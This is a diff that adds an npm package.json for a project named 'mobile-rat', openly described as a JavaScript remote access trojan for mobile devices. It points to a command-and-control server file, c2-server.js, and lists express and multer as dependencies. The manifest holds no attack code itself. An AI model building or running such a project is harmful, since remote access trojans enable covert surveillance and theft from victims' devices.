@@ -1,0 +1,13 @@
+{
+  "name": "mobile-rat",
+  "version": "1.0.0",
+  "description": "JavaScript-based RAT for mobile devices",
+  "main": "c2-server.js",
+  "scripts": {
+    "start": "node c2-server.js"
+  },
+  "dependencies": {
+    "express": "^4.17.1",
+    "multer": "^1.4.4-lts.1"
+  }
+}
